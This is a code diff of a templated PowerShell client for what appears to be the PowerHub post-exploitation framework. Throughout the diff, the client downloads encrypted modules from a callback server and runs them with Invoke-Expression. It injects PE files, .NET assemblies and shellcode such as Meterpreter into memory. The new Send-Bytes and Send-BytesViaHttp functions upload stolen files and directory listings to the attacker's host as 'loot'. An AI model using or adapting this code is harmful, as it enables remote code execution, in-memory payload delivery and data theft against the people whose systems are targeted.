@@ -8,17 +8,15 @@ Run 'Help-PowerHub' for help
 
 $CALLBACK_URL = ${{symbol_name("CALLBACK_URL")}}
 $KEY = ${{symbol_name("KEY")}}
+$WebClient = ${{symbol_name("WebClient")}}
 Set-Alias -Name Decrypt-Code -Value {{symbol_name("Decrypt-Code")}}
+Set-Alias -Name Decrypt-String -Value {{symbol_name("Decrypt-String")}}
+Set-Alias -Name Transport-String -Value {{symbol_name("Transport-String")}}
 
 $WEBDAV_URL = "{{webdav_url}}"
 $ErrorActionPreference = "Stop"
 $PS_VERSION = $PSVersionTable.PSVersion.Major
 {{'$DebugPreference = "Continue"'|debug}}
-
-$WebClient = New-Object net.webclient;
-$WebClient.Proxy = [Net.WebRequest]::GetSystemWebProxy();
-$WebClient.Proxy.Credentials = [Net.CredentialCache]::DefaultCredentials;
-
 
 function Unzip-Code {
      Param ( [byte[]] $byteArray )
@@ -37,12 +35,7 @@ function Unzip-Code {
 }
 
 function Update-HubModules {
-    $URL = "{0}ml" -f $CALLBACK_URL
-    $ModuleList = $WebClient.DownloadString($URL)
-    $ModuleList = [System.Convert]::FromBase64String($ModuleList)
-    $ModuleList = Decrypt-Code $ModuleList $KEY
-    $ModuleList = Unzip-Code $ModuleList
-    $ModuleList = [System.Text.Encoding]::UTF8.GetString($ModuleList)
+    $ModuleList = Transport-String "ml"
     Invoke-Expression $ModuleList
     $Global:Modules = $Modules
 }
@@ -54,12 +47,8 @@ function Import-HubModule {
         $Module
     )
 
-    if ($Module["type"] -eq "ps1") {
+    if ($Module.Type -eq "ps1") {
         $code = $Module.Code
-        $code = [System.Convert]::FromBase64String($code)
-        $code = Decrypt-Code $code $KEY
-        $code = Unzip-Code $code
-        $code = [System.Text.Encoding]::UTF8.GetString($code)
         $sb = [Scriptblock]::Create($code)
         New-Module -ScriptBlock $sb | Out-Null
     }
@@ -178,10 +167,9 @@ Use the '-Verbose' option to print detailed information.
     $result = @()
     foreach ($i in $indices) {
         if ($i -lt $Modules.length -and $i -ge 0) {
-            $compression = "&c=1"
-            if ($PS_VERSION -eq 2) { $compression = "" }
-            $url = "{0}m?m={1}{2}" -f $CALLBACK_URL, $i, $compression
-            $Modules[$i].Code = $WebClient.DownloadString($url);
+            $args = @{"m"="$i"}
+            # if ($PS_VERSION -eq 2) { $args["c"] = "1" }
+            $Modules[$i].Code = Transport-String "m" $args
             $Modules[$i].Loaded = $True
             Import-HubModule $Modules[$i]
         }
@@ -252,9 +240,6 @@ Load the exe module with the name 'meterpreter.exe' in memory and run it
                 } else {
                     $code = $n.Code
                 }
-                $code = [System.Convert]::FromBase64String($code)
-                $code = Decrypt-Code $code $KEY
-                $code = Unzip-Code $code
                 Invoke-ReflectivePEInjection -PEBytes $code -ForceASLR -ExeArgs $ExeArgs
             }
         } else {
@@ -298,9 +283,6 @@ Load the exe module with the name 'meterpreter.exe' in memory and save it to dis
             $m = $n
         }
         $code = $m.Code
-        $code = [System.Convert]::FromBase64String($code)
-        $code = Decrypt-Code $code $KEY
-        $code = Unzip-Code $code
         if ($Directory) {
             $Filename = "$Directory/$($m.BaseName)"
         } else {
@@ -348,9 +330,6 @@ Load the .NET module with the name 'meterpreter.exe' in memory and run it
             $m = $n
         }
         $code = $m.Code
-        $code = [System.Convert]::FromBase64String($code)
-        $code = Decrypt-Code $code $KEY
-        $code = Unzip-Code $code
         $a = [Reflection.Assembly]::Load([byte[]]$code)
         $al = New-Object -TypeName System.Collections.ArrayList
         $al.add($Arguments)
@@ -396,9 +375,6 @@ Load the shellcode module with the name 'meterpreter.bin' in memory and run it
                 $m = $n
             }
             $code = $m.Code
-            $code = [System.Convert]::FromBase64String($code)
-            $code = Decrypt-Code $code $KEY
-            $code = Unzip-Code $code
             if ($ProcessID) {
                 Invoke-Shellcode -Shellcode $code -ProcessID $ProcessID
             } else {
@@ -411,7 +387,7 @@ Load the shellcode module with the name 'meterpreter.bin' in memory and run it
 }
 
 
-function Send-File {
+function Send-Bytes {
     Param(
        [Parameter(Mandatory=$True,Position=0)]
        [Byte[]]$Body,
@@ -434,6 +410,24 @@ function Send-File {
         $FileName = Get-Date -Format o
     }
 
+    $Body = (Decrypt-Code $Body $KEY)
+
+    if ("{{transport}}" -match "^https?$") {
+        Send-BytesViaHttp -LootId $LootId $Body $FileName
+    }
+}
+
+function Send-BytesViaHttp {
+    Param(
+       [Parameter(Mandatory=$True,Position=0)]
+       [Byte[]]$Body,
+
+       [Parameter(Mandatory=$False,Position=1)]
+       [String[]]$FileName,
+
+       [Parameter(Mandatory=$False)]
+       [String] $LootId
+    )
     $boundary = [System.Guid]::NewGuid().ToString()
     $LF = "`r`n"
 
@@ -446,7 +440,7 @@ function Send-File {
     $prebody = [System.Text.Encoding]::UTF8.GetBytes($prebody)
     $postbody = [System.Text.Encoding]::UTF8.GetBytes($postbody)
 
-    $post_url = $($CALLBACK_URL + "u?noredirect=1")
+    $post_url = "$(${CALLBACK_URL})u?script"
     if ($LootId) { $post_url += "&loot=$LootId" }
     {{'Write-Debug "POSTing the file to $post_url..."'|debug}}
     $WebRequest = [System.Net.WebRequest]::Create($post_url)
@@ -515,7 +509,7 @@ Get-ChildItem | PushTo-Hub -Name "directory-listing"
                 $Body = $result | ConvertTo-Json
                 $Body = [system.Text.Encoding]::UTF8.GetBytes($Body)
             }
-            Send-File -LootId $LootId $Body $Name
+            Send-Bytes -LootId $LootId $Body $Name
         } else {
             ForEach ($file in $Files) {
                 {{'Write-Debug "Pushing $File..."'|debug}}
@@ -523,7 +517,7 @@ Get-ChildItem | PushTo-Hub -Name "directory-listing"
                 $fileBin = [System.IO.File]::ReadAllBytes($abspath)
                 if ($Name) { $filename = $name } else { $filename = $file }
 
-                Send-File -LootId $LootId $fileBin $filename
+                Send-Bytes -LootId $LootId $fileBin $filename
 
             }
         }
